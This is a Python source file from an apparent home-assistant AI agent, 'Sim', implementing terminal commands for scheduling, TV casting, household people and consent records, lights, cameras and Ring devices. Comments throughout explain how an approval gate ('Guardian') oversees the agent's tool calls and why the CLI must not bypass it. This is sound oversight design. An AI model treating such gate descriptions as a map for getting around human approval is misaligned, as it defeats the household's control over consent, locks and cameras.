    # missing delay, not a cancel of `thing`.
    head, _, rest = args.partition(" ")
    if head.lower() == "cancel":
        return await _schedule_cancel(rest.strip(), bus=bus, ledger=ledger)

    recurring = False
    if args.lower().startswith("every "):
        recurring, args = True, args[6:].strip()
    delay_text, _, label = args.partition(" ")
    delay = parse_delay(delay_text)
    label = label.strip()
    if delay is None:
        return Outcome(
            "schedule needs a delay with a unit -- `schedule 15m water the plants`, "
            "`schedule every 1h check the build`, or bare `schedule` to list what is set.",
            exit_repl=False,
        )
    if not label:
        return Outcome("schedule needs something to say when it fires.", exit_repl=False)

    schedule_id = uuid.uuid4().hex[:12]
    payload = {"schedule_id": schedule_id, "label": label,
               "at": None if recurring else clock.now() + delay,
               "every_seconds": delay if recurring else None}
    await bus.publish(bus.new(topics.SYSTEM_SCHEDULE_ADD, payload))
    when = f"every {delay_text}" if recurring else f"in {delay_text}"
    return Outcome(f"scheduled {when}: {label}  ({schedule_id})", exit_repl=False)


async def _live_schedules(ledger: LedgerClient) -> dict[str, dict]:
    """Every schedule that is armed right now, id -> its `added` payload.

    One reader for `schedule` and `schedule cancel`, so the two can
    never disagree about what is live.
    """
    live: dict[str, dict] = {}
    for event in await ledger.read(SCHEDULE_STREAM):
        payload = event.payload or {}
        schedule_id = str(payload.get("schedule_id") or "")
        if not schedule_id:
            continue
        if event.type == "schedule.added":
            live[schedule_id] = dict(payload)
        elif event.type == "schedule.cancelled":
            live.pop(schedule_id, None)
        elif event.type == "schedule.fired":
            # A one-shot that has already fired is not live, and the
            # Kernel's own projection has always known it
            # (`kernel/scheduler.py::ScheduleView.apply` sets `fired`
            # and `active()` drops it). This reader did not, so
            # `schedule` listed every reminder ever set as still
            # pending and `schedule cancel <that id>` answered
            # "cancelled <label>" -- the cheerful lie about a stopped
            # timer that the id check below it exists to prevent, for
            # the id shape most likely to be typed at it (observer,
            # 2026-09-10).
            entry = live.get(schedule_id)
            if entry is None:
                continue
            next_fire_at = payload.get("next_fire_at")
            if next_fire_at is None:
                live.pop(schedule_id, None)
            else:
                # Recurring: still live, and now due at its next time
                # rather than the one it was armed with hours ago.
                entry["fire_at"] = next_fire_at
    return live


async def _schedule_cancel(schedule_id: str, *, bus: BusClient, ledger: LedgerClient) -> Outcome:
    """`schedule cancel <id>` -- the only producer of `system.schedule.cancel`.

    The id is checked against the live listing first. Publishing a
    cancel for an id the Kernel does not hold is not an error there --
    `_on_schedule_cancel` appends the record and finds no timer to
    cancel -- so a typo would otherwise be answered with a cheerful
    "cancelled" and nothing would have stopped.
    """
    schedule_id = (schedule_id or "").strip()
    if not schedule_id:
        return Outcome("cancel needs an id -- bare `schedule` lists them.", exit_repl=False)
    try:
        live = await _live_schedules(ledger)
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
    if schedule_id not in live:
        near = difflib.get_close_matches(schedule_id, sorted(live), n=3, cutoff=0.4)
        hint = f"; did you mean {', '.join(near)}?" if near else " -- bare `schedule` lists them"
        return Outcome(f"nothing scheduled with id {schedule_id!r}{hint}", exit_repl=False)
    await bus.publish(bus.new(topics.SYSTEM_SCHEDULE_CANCEL, {"schedule_id": schedule_id}))
    return Outcome(f"cancelled {schedule_id}: {live[schedule_id].get('label', '')}".rstrip(": "),
                   exit_repl=False)


async def _schedule_list(ledger: LedgerClient) -> Outcome:
    try:
        live = await _live_schedules(ledger)
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
    if not live:
        return Outcome("nothing scheduled. `schedule 15m <label>` or `schedule every 1h <label>`.",
                       exit_repl=False)
    lines = []
    for schedule_id, payload in sorted(live.items(), key=lambda kv: kv[1].get("fire_at") or 0):
        recurrence = payload.get("recurrence") or {}
        every = recurrence.get("every_s")
        when = f"every {int(every)}s" if every else f"at {payload.get('fire_at')}"
        lines.append(f"  {schedule_id}  {when}  {payload.get('label', '')}")
    return Outcome(f"{len(live)} scheduled:\n" + "\n".join(lines), exit_repl=False)


async def _tv(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`tv ...`: sugar over the cast tools (execution/media/cast.py), so
    every verb is a tool call Guardian sees -- the same path as `tool
    cast_show {...}`, spelt for a person."""
    words = (args or "").strip().split()
    verb = words[0].lower() if words else "show"
    rest = words[1:]
    usage = ("usage: tv setup [device] | devices | use <device> | show [tv|dash] [device] | view <home|discover|cameras|news|"
             "markets|media|terminal|ambient> [1D|1W|1M|1Y] [symbol] | rotate <seconds|off> | scale <factor|auto> | live <n> | "
             "quality light|full | sound on|off | remote | link | pair [again|code] | app <name|url> | key <key> | charts [kpop|us] | "
             "video <url> [full|frame] [device] | stop [frame] | volume <0-100> [device]")

    async def _run(tool: str, payload: dict) -> Outcome:
        return await _run_tool(bus=bus, ledger=ledger, tool=tool, raw=json.dumps(payload), session_id=session_id,
                               timeout=120.0)

    if verb == "devices":
        return await _run("cast_devices", {})
    if verb == "pair":
        if rest and rest[0].lower() in ("again", "new", "reset", "force"):
            return await _run("tv_pair", {"again": True})
        return await _run("tv_pair", {"pin": rest[0]} if rest else {})
    if verb == "app":
        if not rest:
            return Outcome("usage: tv app <youtube|netflix|disney|prime|spotify|plex|url>")
        return await _run("tv_app", {"app": " ".join(rest)})
    if verb == "key":
        if not rest:
            return Outcome("usage: tv key <home|back|ok|up|down|left|right|play|pause|next|mute|volume up|power>")
        return await _run("tv_key", {"key": " ".join(rest)})
    if verb in ("charts", "chart"):
        return await _run("tv_charts", {"chart": " ".join(rest) or "kpop"})
    if verb in ("next", "previous", "pause", "play", "resume", "back", "home", "mute", "ok", "up", "down", "left", "right"):
        # `tv next` -- the creator typed `next` when Sim said "say next" (2026-09-13)
        return await _run("tv_key", {"key": "play" if verb == "resume" else verb})
    if verb == "setup":
        return await _run("cast_setup", {"device": " ".join(rest)} if rest else {})
    if verb == "use":
        if not rest:
            return Outcome("usage: tv use <device name>   (`tv devices` lists them)")
        return await _run("cast_use", {"device": " ".join(rest)})
    if verb in ("show", "dash", "dashboard"):
        payload = {}
        if verb != "show":
            payload["page"] = "dash"
        if rest and rest[0].lower() in ("tv", "terminal", "tui", "dash", "dashboard"):
            payload["page"] = "tv" if rest[0].lower() in ("tv", "terminal", "tui") else "dash"
            rest = rest[1:]
        if rest:
            payload["url" if rest[0].startswith(("http://", "https://")) else "device"] = " ".join(rest)
        return await _run("cast_show", payload)
    if verb == "view":
        if not rest:
            return Outcome("usage: tv view <home|cameras|markets|charts|ambient> [1D|1W|1M|1Y] [symbol]   "
                           "(news, discover, media and terminal all live inside home now)")
        payload = {"view": rest[0]}
        for word in rest[1:]:
            if word.upper() in ("1D", "1W", "1M", "1Y"):
                payload["timeframe"] = word.upper()
            else:
                payload["symbol"] = word.upper()
        return await _run("dash_view", payload)
    if verb == "rotate":
        if not rest:
            return Outcome("usage: tv rotate <seconds|off>")
        seconds = 0 if rest[0].lower() in ("off", "stop", "0") else rest[0]
        try:
            seconds = float(seconds)
        except ValueError:
            return Outcome("usage: tv rotate <seconds|off>")
        return await _run("dash_view", {"rotate_s": seconds})
    if verb in ("scale", "zoom"):
        if not rest:
            return Outcome("usage: tv scale <factor|auto>   (0.5 shows the whole page on a receiver that reports twice its size)")
        raw = rest[0].lower()
        try:
            scale = 0.0 if raw in ("auto", "fit", "0") else float(raw.rstrip("x"))
        except ValueError:
            return Outcome("usage: tv scale <factor|auto>")
        return await _run("dash_view", {"scale": scale})
    if verb in ("live", "feeds"):
        if not rest or not rest[0].isdigit():
            return Outcome("usage: tv live <n> [seconds]   (how many camera feeds play at once, and how often the live "
                           "window slides one camera on; fewer if the TV stutters)")
        payload = {"live_max": int(rest[0])}
        if len(rest) > 1:
            try:
                payload["live_step_s"] = float(rest[1])
            except ValueError:
                return Outcome("usage: tv live <n> [seconds]")
        return await _run("dash_view", payload)
    if verb in ("sound", "audio"):
        if not rest or rest[0].lower() not in ("on", "off", "true", "false", "yes", "no"):
            return Outcome("usage: tv sound on|off   (the embedded videos' sound, on by default -- in the browser too)")
        return await _run("dash_view", {"video_sound": rest[0].lower() in ("on", "true", "yes")})
    if verb in ("quality", "video-quality"):
        if not rest or rest[0].lower() not in ("light", "full", "low", "high", "hd"):
            return Outcome("usage: tv quality light|full   (the embedded video's resolution; light is easier on the TV)")
        return await _run("dash_view", {"video_quality": "full" if rest[0].lower() in ("full", "high", "hd") else "light"})
    if verb in ("nav", "press"):
        if not rest:
            return Outcome("usage: tv nav <left|right|up|down|ok|back|playpause|next|prev> [times]   "
                           "(a remote key on the dashboard page itself)")
        payload: dict = {"key": " ".join(w for w in rest if not w.isdigit())}
        counts = [w for w in rest if w.isdigit()]
        if counts:
            payload["times"] = int(counts[0])
        return await _run("dash_key", payload)
    if verb == "remote":
        return await _run("dash_view", {"action": "remote"})
    if verb in ("link", "url"):
        return await _run("dash_view", {"action": "link"})
    if verb in ("video", "play"):
        if not rest:
            return Outcome(usage)
        url = rest[0]
        mode = "frame"
        device = []
        for word in rest[1:]:
            if word.lower() in ("full", "fullscreen"):
                mode = "full"
            elif word.lower() in ("frame", "framed", "box"):
                mode = "frame"
            else:
                device.append(word)
        payload = {"url": url, "mode": mode}
        if device:
            payload["device"] = " ".join(device)
        return await _run("cast_play", payload)
    if verb in ("stop", "off", "quit", "close"):
        # `tv off` is what a person types (the creator, 2026-09-13, at 15:13).
        payload = {"what": "frame"} if rest and rest[0].lower() in ("frame", "framed", "box") else {}
        return await _run("cast_stop", payload)
    if verb == "volume":
        if not rest:
            return Outcome(usage)
        try:
            level = float(rest[0].rstrip("%"))
        except ValueError:
            return Outcome(usage)
        payload = {"level": level}
        if rest[1:]:
            payload["device"] = " ".join(rest[1:])
        return await _run("cast_volume", payload)
    import difflib

    close = difflib.get_close_matches(verb, ["setup", "devices", "use", "show", "view", "rotate", "scale", "live",
                                             "quality", "remote", "link", "video", "stop", "volume"], n=1, cutoff=0.6)
    if close:
        return Outcome(f"tv: unknown verb {verb!r} -- did you mean `tv {close[0]}`?")
    return Outcome(f"tv: unknown verb {verb!r} -- {usage}")


#: `people` -- who Sim knows, what they said yes to, what they care
#: about (stage 10 item 4). Reading is a World Model query; every
#: CHANGE goes through the `people` tool, which is tier 3, so a
#: person confirms it. That asymmetry is the whole design: consent is
#: something a household gives, never something Sim records because
#: somebody typed it convincingly.
PEOPLE_VERBS: tuple[tuple[str, str, str], ...] = (
    ("", "", "everybody Sim knows: role, what they said yes to, what they care about"),
    ("<name>", "", "one person in detail"),
    ("grant", "<name> <permission>", "record that somebody said yes (wellbeing_checkins, interest_shares)"),
    ("revoke", "<name> <permission>", "withdraw it -- and drop what was kept under it"),
    ("interest", "add|remove <name> <topic>", "what they care about, for interest shares"),
    ("role", "<name> <owner|adult|child|guest>", "what their role may ask for"),
    ("link", "<name> <identity>", "tie a handle or voice to a person: telegram:x, voice:y"),
    ("unlink", "<identity>", "that handle is nobody's again"),
    ("wrong", "<ref> [why]", "that unprompted message was wrong or unwanted"),
)
_PEOPLE_COLUMN = max(len(f"{verb} {args}".strip()) for verb, args, _w in PEOPLE_VERBS) + 2
_PEOPLE_USAGE = "\n".join(f"  people {f'{verb} {args}'.strip():<{_PEOPLE_COLUMN}}{what}"
                          for verb, args, what in PEOPLE_VERBS)


async def _people(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`people ...`: who Sim knows and what they agreed to."""
    from . import peopleview

    words = (args or "").strip().split()
    verb = words[0].lower() if words else ""
    rest = words[1:]

    async def _change(action: str, payload: dict) -> Outcome:
        # Through the TOOL, not through `world.people.update`: the tool
        # is tier 3, so Guardian stops and asks. Writing to the store
        # from here would be a back door around the one gate that makes
        # consent mean anything.
        return await _run_tool(bus=bus, ledger=ledger, tool="people",
                               raw=json.dumps({"action": action, **payload}),
                               session_id=session_id, timeout=120.0)

    if verb in ("", "list", "all"):
        return await _request(bus, topics.WORLD_ENV_QUERY, {"what": "people", "args": {}},
                              timeout=10.0, render=peopleview.everybody)
    if verb in ("grant", "revoke"):
        if len(rest) != 2:
            return Outcome(f"usage: people {verb} <name> <permission>\n"
                           f"  permissions: {', '.join(PERMISSIONS)}")
        return await _change(verb, {"name": rest[0], "permission": rest[1].lower()})
    if verb in ("interest", "interests"):
        if len(rest) < 3 or rest[0].lower() not in ("add", "remove"):
            return Outcome("usage: people interest add|remove <name> <topic>")
        return await _change(f"{rest[0].lower()}_interest", {"name": rest[1], "interest": " ".join(rest[2:])})
    if verb == "role":
        if len(rest) != 2:
            return Outcome("usage: people role <name> <owner|adult|child|guest>")
        return await _change("set_role", {"name": rest[0], "role": rest[1].lower()})
    if verb == "link":
        if len(rest) != 2:
            return Outcome("usage: people link <name> <identity>   (telegram:x, whatsapp:+1..., voice:y)")
        return await _change("link", {"name": rest[0], "identity": rest[1]})
    if verb == "unlink":
        if len(rest) != 1:
            return Outcome("usage: people unlink <identity>")
        return await _change("unlink", {"identity": rest[0]})
    if verb == "wrong":
        # Not through the `people` tool: this changes nobody's
        # permissions and needs no gate, and putting a tier-3 approval
        # in front of "that was annoying" is how feedback stops
        # arriving (stage 10 item 10).
        if not rest:
            return Outcome("usage: people wrong <ref> [why]\n"
                           "  the ref is on the notice, and in `initiative.offered`")
        return await _publish(
            bus, topics.INITIATIVE_MARKED_WRONG,
            {"ref": rest[0], "by": "cli", "why": " ".join(rest[1:]) or "wrong"},
            render_ok=f"noted: {rest[0]} was wrong. That is the only score of this Sim can trust.")
    if verb in ("help", "?"):
        return Outcome(_PEOPLE_USAGE)
    # Anything else is a name: one person in detail.
    return await _request(bus, topics.WORLD_ENV_QUERY, {"what": "people", "args": {"name": " ".join(words)}},
                          timeout=10.0, render=peopleview.one)


#: A word that means "on" and a word that means "off", as people type
#: them. `1`/`0` because a tired hand reaches for them, `yes`/`no`
#: because somebody will.
_ON_WORDS = frozenset({"on", "1", "yes", "true", "up"})
_OFF_WORDS = frozenset({"off", "0", "no", "false", "down"})

#: `home` and `light` are two doors into the same four tools. The
#: creator asked for both (2026-09-20): a full family for the house,
#: and a short one for the thing anybody actually types twenty times a
#: day. `light on kitchen` is three words; the `tool home_call` form
#: underneath it is a service name and a line of JSON, which is the
#: right interface for a model and the wrong one for a person standing
#: in a dark kitchen.
HOME_VERBS: tuple[tuple[str, str, str], ...] = (
    ("", "", "what the house is doing: what is on, who is where, what is stale"),
    ("find", "<words>", "what matches: \"kitchen\", \"anything with a battery\""),
    ("state", "<thing>", "one thing, as it is right now"),
    ("on", "<thing>", "turn it on"),
    ("off", "<thing>", "turn it off"),
    ("dim", "<thing> <0-100>", "set a light's brightness"),
    ("toggle", "<thing>", "the other way from whatever it is now"),
    ("scene", "<name>", "run a scene"),
    ("call", "<service> <thing> [json]", "any service at all, for what the words above do not cover"),
    ("undo", "<thing>", "put back what the last call changed"),
)
_HOME_COLUMN = max(len(f"{verb} {args}".strip()) for verb, args, _w in HOME_VERBS) + 2
_HOME_USAGE = "\n".join(f"  home {f'{verb} {args}'.strip():<{_HOME_COLUMN}}{what}"
                        for verb, args, what in HOME_VERBS)


def _switched(target: str, on: bool) -> tuple[str, dict]:
    """The service for turning `target` on or off.

    `homeassistant.turn_on` rather than `light.turn_on`: the domain is
    the entity's business, not the typist's, and a person saying "turn
    the kettle on" should not have to know whether Home Assistant
    filed it under `switch` or `light`. `home_call` resolves the name
    and refuses an ambiguous one rather than guessing.
    """
    return f"homeassistant.turn_{'on' if on else 'off'}", {"target": target}


async def _home(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`home ...`: the house, in the words a person would use.

    Every verb here is one `home_*` tool call, so it goes through
    `action.proposed` and Guardian exactly as the model's own call
    does -- a lamp passes unattended, a lock or a camera's recording
    stops and asks. The CLI is another caller in front of the gate,
    never a way round it.
    """
    words = (args or "").strip().split()
    verb = words[0].lower() if words else ""
    rest = " ".join(words[1:]).strip()

    async def _run(tool: str, payload: dict, timeout: float = 60.0) -> Outcome:
        return await _run_tool(bus=bus, ledger=ledger, tool=tool, raw=json.dumps(payload),
                               session_id=session_id, timeout=timeout)

    if verb in ("", "state", "?") and not rest:
        # A bare `home` is "what is going on", and that is the World
        # Model's `home` facet -- entities that are fresh, who is
        # where, what is stale. The first version asked `home_state`
        # for a thing called "on" and got, correctly, "nothing in the
        # house matches 'on'; nearest: zone.home" (live, 2026-09-20,
        # the first time the creator typed it).
        from . import homeview

        if verb == "?":
            return Outcome(_HOME_USAGE)
        return await _request(bus, topics.WORLD_ENV_QUERY, {"what": "home", "args": {}},
                              timeout=10.0, render=homeview.situation)
    if verb in ("find", "search", "what", "ls", "list"):
        return await _run("home_find", {"query": rest}) if rest else Outcome(_HOME_USAGE)
    if verb == "state":
        if rest in ("?", "help"):
            return Outcome(_HOME_USAGE)
        return await _run("home_state", {"target": rest})
    if verb in _ON_WORDS | _OFF_WORDS and not rest:
        return Outcome(_HOME_USAGE)
    if verb in ("on", "off"):
        if not rest:
            return Outcome("usage: home on <thing>   (home find <words> lists what matches)")
        service, payload = _switched(rest, verb == "on")
        return await _run("home_call", {"service": service, **payload})
    if verb in ("dim", "brightness", "level"):
        parts = rest.rsplit(" ", 1)
        if len(parts) != 2 or not parts[1].rstrip("%").isdigit():
            return Outcome("usage: home dim <thing> <0-100>")
        return await _run("home_call", {"service": "light.turn_on", "target": parts[0],
                                        "brightness_pct": int(parts[1].rstrip("%"))})
    if verb == "toggle":
        if not rest:
            return Outcome("usage: home toggle <thing>")
        return await _run("home_call", {"service": "homeassistant.toggle", "target": rest})
    if verb == "scene":
        if not rest:
            return Outcome("usage: home scene <name>")
        return await _run("home_call", {"service": "scene.turn_on", "target": rest})
    if verb in ("call", "service"):
        parts = rest.split(" ", 1)
        if len(parts) < 2:
            return Outcome('usage: home call <service> <thing> [{"extra": "options"}]')
        service, tail = parts[0], parts[1].strip()
        extra: dict = {}
        if tail.startswith("{"):
            try:
                extra, tail = json.loads(tail), ""
            except ValueError:
                return Outcome("that JSON did not parse")
        elif " {" in tail:
            target, _, raw = tail.partition(" {")
            try:
                extra, tail = json.loads("{" + raw), target.strip()
            except ValueError:
                return Outcome("that JSON did not parse")
        return await _run("home_call", {"service": service, **({"target": tail} if tail else {}), **extra})
    if verb == "undo":
        return await _run("home_undo", {"entity": rest}) if rest else Outcome("usage: home undo <thing>")
    if verb in ("describe", "explain"):
        return await _run("home_describe", {"query": rest or "the house"})
    return Outcome(_HOME_USAGE)


async def _light(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`light ...`: the short way to the thing people do most.

    Deliberately redundant with `home` (the creator asked for both):
    turning a light on is the single most common thing anybody wants
    from a house, and it should cost three words. `light kitchen on`
    and `light on kitchen` both work, because both are what people
    type and arguing with them is not a feature.
    """
    words = (args or "").strip().split()
    if not words:
        return await _home("find light", bus=bus, ledger=ledger, session_id=session_id)

    head, tail = words[0].lower(), words[-1].lower()
    # `light on kitchen` and `light kitchen on` are the same sentence.
    if head in _ON_WORDS or head in _OFF_WORDS:
        state, target = head, " ".join(words[1:])
    elif tail in _ON_WORDS or tail in _OFF_WORDS:
        state, target = tail, " ".join(words[:-1])
    elif tail.rstrip("%").isdigit():
        return await _home(f"dim {' '.join(words[:-1])} {tail}", bus=bus, ledger=ledger, session_id=session_id)
    elif head in ("list", "all"):
        return await _home("find light", bus=bus, ledger=ledger, session_id=session_id)
    else:
        return await _home(f"state {' '.join(words)}", bus=bus, ledger=ledger, session_id=session_id)

    if not target:
        return Outcome("usage: light on <name> | light <name> off | light <name> 40 | light list")
    return await _home(f"{'on' if state in _ON_WORDS else 'off'} {target}",
                       bus=bus, ledger=ledger, session_id=session_id)


async def _cameras(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`cameras ...`: sugar over the cam_* tools (execution/home/cameras.py)."""
    words = (args or "").strip().split()
    verb = words[0].lower() if words else "list"
    rest = words[1:]
    usage = ("usage: cameras list | state [camera] | show <cameras|all> [grid|full|frame|stop] | snapshot <camera> | "
             "light <camera> on|off | ir <camera> on|off | siren <camera> [seconds] | ptz <camera> <move> | "
             "recordings <camera> [today|yesterday|<n>h] | watch on|off | setup <host> <user>")

    async def _run(tool: str, payload: dict, timeout: float = 120.0) -> Outcome:
        return await _run_tool(bus=bus, ledger=ledger, tool=tool, raw=json.dumps(payload), session_id=session_id,
                               timeout=timeout)

    if verb == "list":
        return await _run("cam_list", {})
    if verb == "state":
        return await _run("cam_state", {"camera": " ".join(rest)})
    if verb in ("show", "stream", "live"):
        if not rest:
            return Outcome(usage)
        mode = rest[-1].lower() if rest[-1].lower() in ("frame", "grid", "full", "stop", "tiled", "dash", "dashboard") else ""
        camera = " ".join(rest[:-1] if mode else rest) or "all"
        return await _run("cam_stream", {"camera": camera, "mode": {"tiled": "grid", "dashboard": "dash"}.get(mode, mode) or "frame"})
    if verb in ("snapshot", "snap", "picture"):
        return await _run("cam_snapshot", {"camera": " ".join(rest)}) if rest else Outcome(usage)
    if verb in ("light", "spotlight", "ir"):
        if len(rest) < 2:
            return Outcome(usage)
        return await _run("cam_light" if verb != "ir" else "cam_ir",
                          {"camera": " ".join(rest[:-1]), "on": rest[-1].lower() in ("on", "true", "1")})
    if verb == "siren":
        # "siren Office on" read the camera as "Office on" and was refused
        # (2026-09-14, live): the siren is timed, so `on` means "sound it"
        # and `off` gets an answer rather than a camera name.
        if rest and rest[-1].lower() == "off":
            return Outcome("a camera's siren stops by itself: it sounds for the seconds given (default 5, at most 30)")
        if rest and rest[-1].lower() == "on":
            rest = rest[:-1]
        if not rest:
            return Outcome(usage)
        seconds = int(rest[-1]) if rest[-1].isdigit() else None
        camera = " ".join(rest[:-1] if seconds is not None else rest)
        return await _run("cam_siren", {"camera": camera, **({"seconds": seconds} if seconds else {})})
    if verb in ("ptz", "move"):
        if len(rest) < 2:
            return Outcome(usage)
        if rest[-1].isdigit() and len(rest) >= 3 and rest[-2].lower() == "preset":
            return await _run("cam_ptz", {"camera": " ".join(rest[:-2]), "command": "preset", "preset": int(rest[-1])})
        return await _run("cam_ptz", {"camera": " ".join(rest[:-1]), "command": rest[-1].lower()})
    if verb == "recordings":
        if not rest:
            return Outcome(usage)
        period = rest[-1].lower() if rest[-1].lower() in ("today", "yesterday") or re.fullmatch(r"\d+h", rest[-1].lower()) else ""
        camera = " ".join(rest[:-1] if period else rest)
        return await _run("cam_recordings", {"camera": camera, **({"period": period} if period else {})})
    if verb == "watch":
        return await _run("cam_watch", {"on": not rest or rest[0].lower() not in ("off", "stop")})
    if verb == "setup":
        if len(rest) > 2:
            return Outcome(_NO_PASSWORD_ON_THE_LINE.format(cmd=f"cameras setup {rest[0]} {rest[1]}"))
        if len(rest) < 2:
            return Outcome("usage: cameras setup <host> <username>   (the password is asked for, hidden)")
        handed = await _hand_off_password("reolink", "Reolink NVR password")
        if handed is not None:
            return handed
        return await _run("cam_setup", {"host": rest[0], "username": rest[1]}, timeout=60.0)
    return Outcome(f"cameras: unknown verb {verb!r} -- {usage}")


_NO_PASSWORD_ON_THE_LINE = ("refused: a password on the command line would be ledgered with the tool call. Run `{cmd}` "
                            "and type it when asked -- it is not echoed, not logged, and reaches the tool through a file "
                            "only you can read, deleted once used.")
_SECRET_ARG_KEYS = frozenset({"password", "passwd", "pass", "secret", "api_key", "apikey", "token"})


async def _hidden_input(prompt: str) -> str | None:
    """A line typed with echo off, or None when there is no terminal to
    ask on (a chat turn, a pipe). Runs off the loop; the TUI's prompt is
    idle while a command is being handled."""
    import asyncio
    import getpass
    import sys

    if not (sys.stdin and sys.stdin.isatty()):
        return None
    try:
        return await asyncio.to_thread(getpass.getpass, prompt)
    except (EOFError, KeyboardInterrupt):
        return ""


async def _hand_off_password(name: str, what: str) -> Outcome | None:
    """Ask for `what` hidden and write it for the tool to read once.
    Returns an Outcome when the command must stop here (no terminal, or
    nothing typed); None when the tool call can proceed."""
    from simorgh.contracts.settings import write_handoff

    typed = await _hidden_input(f"{what} (hidden, not logged): ")
    if typed is None:
        return Outcome("refused: the password has to be typed at Sim's terminal, where it can be asked for hidden; "
                       "this channel cannot take it safely")
    if not typed.strip():
        return Outcome("nothing typed; the login was not changed")
    write_handoff(name, {"password": typed})
    return None


async def _ring(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`ring ...`: sugar over the ring_* tools (execution/home/ring.py)."""
    words = (args or "").strip().split()
    verb = words[0].lower() if words else "list"
    rest = words[1:]
    usage = ("usage: ring list | snapshot <camera|all> | events [camera] [n] | light <camera> on|off | siren <camera> [seconds] | "
             "watch on|off [seconds] | setup <email> [code]")

    async def _run(tool: str, payload: dict, timeout: float = 120.0) -> Outcome:
        return await _run_tool(bus=bus, ledger=ledger, tool=tool, raw=json.dumps(payload), session_id=session_id,
                               timeout=timeout)

    if verb in ("list", "cameras"):
        return await _run("ring_list", {})
    if verb in ("snapshot", "snap", "picture"):
        return await _run("ring_snapshot", {"camera": " ".join(rest) or "all"})
    if verb in ("events", "history"):
        limit = int(rest[-1]) if rest and rest[-1].isdigit() else None
        camera = " ".join(rest[:-1] if limit is not None else rest)
        payload = {}
        if camera:
            payload["camera"] = camera
        if limit:
            payload["limit"] = limit
        return await _run("ring_events", payload)
    if verb == "light":
        if len(rest) < 2:
            return Outcome(usage)
        return await _run("ring_light", {"camera": " ".join(rest[:-1]), "on": rest[-1].lower() in ("on", "true", "1")})
    if verb == "siren":
        if rest and rest[-1].lower() == "off":
            return Outcome("a Ring siren stops by itself: it sounds for the seconds given")
        if rest and rest[-1].lower() == "on":
            rest = rest[:-1]
        if not rest:
            return Outcome(usage)
        seconds = int(rest[-1]) if rest[-1].isdigit() else None
        camera = " ".join(rest[:-1] if seconds is not None else rest)
        return await _run("ring_siren", {"camera": camera, **({"seconds": seconds} if seconds else {})})
    if verb == "watch":
        on = not rest or rest[0].lower() not in ("off", "stop")
        payload = {"on": on}
        if len(rest) > 1 and rest[1].isdigit():
            payload["every_s"] = float(rest[1])
        return await _run("ring_watch", payload)
    if verb in ("setup", "login"):
        if not rest:
            return Outcome("usage: ring setup <email> [code]   (the password is asked for, hidden; the code once Ring texts it)")
        if len(rest) > 2 or (len(rest) == 2 and not rest[1].isdigit()):
            return Outcome(_NO_PASSWORD_ON_THE_LINE.format(cmd=f"ring setup {rest[0]}"))
        handed = await _hand_off_password("ring", f"Ring password for {rest[0]}")
        if handed is not None:
            return handed
        payload = {"email": rest[0]}
        if len(rest) == 2:
            payload["code"] = rest[1]
        return await _run("ring_setup", payload, timeout=90.0)
    return Outcome(f"ring: unknown verb {verb!r} -- {usage}")


async def _tool_command(args: str, *, bus: BusClient, ledger: LedgerClient,
                        session_id: str, timeout: float = 300.0) -> Outcome:
    """Run any registered tool, from the terminal, through Guardian.

    Fifty tools and sixteen commands: adding a command per tool would
    make the help screen unreadable and still not answer the question a
    person actually has. One command reaching all of them is the better
    trade, and it costs nothing in safety -- this publishes
    `action.proposed` exactly as a Worker does, so Guardian sees it, an
    irreversible call still stops at the approval prompt, and the whole
    thing is ledgered like any other action. The CLI is not a back door
    around the gate; it is another caller in front of it.
    """
    args = (args or "").strip()
    if not args:
        return await _tool_list(ledger)

    name, _, rest = args.partition(" ")
    name = name.strip()
    rest = rest.strip()
    known = await _known_tools(ledger)
    if known and name not in known:
        near = difflib.get_close_matches(name, sorted(known), n=3, cutoff=0.5)
        hint = f"; did you mean {', '.join(near)}?" if near else " -- `tool` lists them all"
        return Outcome(f"no tool called {name!r}{hint}")

    if not rest and name not in _NO_ARG_TOOLS:
        return Outcome(f"{name} takes {describe_arguments(name)}\n"
                       f"  tool {name} {describe_arguments(name)}")

    return await _run_tool(bus=bus, ledger=ledger, tool=name, raw=rest,
                           session_id=session_id, timeout=timeout)


async def _tool_list(ledger: LedgerClient) -> Outcome:
    known = await _known_tools(ledger)
    if not known:
        return Outcome("no tools registered yet -- they announce themselves just after boot.")
    marks = {"read_only": "good", "reversible": "busy", "irreversible": "warn"}
    groups: dict[str, list] = {}
    for tool_name, row in sorted(known.items()):
        reversibility = str(row.get("reversibility", ""))
        groups.setdefault(_tool_group(tool_name), []).append(render_mod.PanelRow(
            tool_name, (reversibility.replace("_", " "),), str(row.get("description") or ""),
            marks.get(reversibility, "idle")))
    sections = [render_mod.PanelSection(group[:1].upper() + group[1:], rows) for group, rows in sorted(groups.items())]
    return Outcome(render_mod.panel(
        "Tools", sections, count=str(len(known)),
        legend=(("good", "read only"), ("busy", "reversible"), ("warn", "irreversible")),
        footer="\u00b7 `tool <name> <args>` runs one; Guardian gates it as it gates the model",
        enabled=render_mod.color_enabled(), unicode=render_mod.unicode_mode() != "off"))


#: Prefix -> the heading it is listed under. A flat list of fifty names
#: is not something anyone reads.
_TOOL_GROUPS: tuple[tuple[str, str], ...] = (
    ("cam_", "the cameras"),
    ("cast_", "media -- the TV"),
    ("kb_", "documents"), ("cal_", "calendar and mail"), ("mail_", "calendar and mail"),
    ("remind", "calendar and mail"), ("sec_", "security"), ("home_", "the house"),
    ("energy_", "energy"), ("media_", "media"), ("git_", "source control"),
    ("run_", "running things"), ("web_", "the web"), ("apply_", "changing code"),
    ("mcp_", "mcp servers"),
)


def _tool_group(name: str) -> str:
    for prefix, group in _TOOL_GROUPS:
        if name.startswith(prefix):
            return group
    return "everything else"


_NO_ARG_TOOLS = frozenset({"kb_status", "sec_self", "sec_posture", "energy_status",
                           "home_describe", "media_now", "self_map", "git_revert",
                           "cast_devices", "cast_show", "cast_stop", "cast_setup", "cam_list"})


async def _known_tools(ledger: LedgerClient) -> dict[str, dict]:
    """The latest registration per tool name, from the Ledger.

    The Ledger rather than a bus query because a registration is an
    append-only fact that survives a restart, and because `capabilities`
